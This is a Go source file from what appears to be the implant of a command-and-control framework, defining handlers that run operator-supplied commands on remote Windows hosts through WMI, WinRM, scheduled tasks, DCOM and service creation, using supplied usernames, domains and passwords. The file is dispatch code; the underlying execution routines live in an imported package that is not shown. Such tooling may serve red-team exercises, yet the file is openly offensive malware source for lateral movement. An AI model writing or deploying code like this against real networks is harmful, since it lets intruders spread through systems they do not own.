package main

import (
	"fmt"

	"github.com/mjopsec/taburtuaiC2/implant/lateral"
	"github.com/mjopsec/taburtuaiC2/pkg/types"
)

func handleLateralWMI(cmd *types.Command, result *types.CommandResult) {
	if cmd.LateralTarget == "" || cmd.LateralCommand == "" {
		result.Error = "lateral_wmi: lateral_target and lateral_command are required"
		result.ExitCode = 1
		return
	}
	out, err := lateral.WMIExec(cmd.LateralTarget, cmd.LateralCommand, cmd.LateralUser, cmd.LateralDomain, cmd.LateralPass)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = out
}

func handleLateralWinRM(cmd *types.Command, result *types.CommandResult) {
	if cmd.LateralTarget == "" || cmd.LateralCommand == "" {
		result.Error = "lateral_winrm: lateral_target and lateral_command are required"
		result.ExitCode = 1
		return
	}
	out, err := lateral.WinRMExec(cmd.LateralTarget, cmd.LateralCommand, cmd.LateralUser, cmd.LateralDomain, cmd.LateralPass)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = out
}

func handleLateralSchtask(cmd *types.Command, result *types.CommandResult) {
	if cmd.LateralTarget == "" || cmd.LateralCommand == "" {
		result.Error = "lateral_schtask: lateral_target and lateral_command are required"
		result.ExitCode = 1
		return
	}
	out, err := lateral.SchtaskExec(cmd.LateralTarget, cmd.LateralCommand, cmd.LateralUser, cmd.LateralDomain, cmd.LateralPass)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = out
}

func handleLateralDCOM(cmd *types.Command, result *types.CommandResult) {
	if cmd.LateralTarget == "" || cmd.LateralCommand == "" {
		result.Error = "lateral_dcom: lateral_target and lateral_command are required"
		result.ExitCode = 1
		return
	}
	out, err := lateral.DCOMExec(cmd.LateralTarget, cmd.LateralCommand, cmd.LateralDCOMMethod)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] DCOM %s → %s: command dispatched\n%s",
		cmd.LateralDCOMMethod, cmd.LateralTarget, out)
}

func handleLateralService(cmd *types.Command, result *types.CommandResult) {
	if cmd.LateralTarget == "" || cmd.LateralCommand == "" {
		result.Error = "lateral_service: lateral_target and lateral_command are required"
		result.ExitCode = 1
		return
	}
	out, err := lateral.ServiceExec(cmd.LateralTarget, cmd.LateralCommand)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = out
}
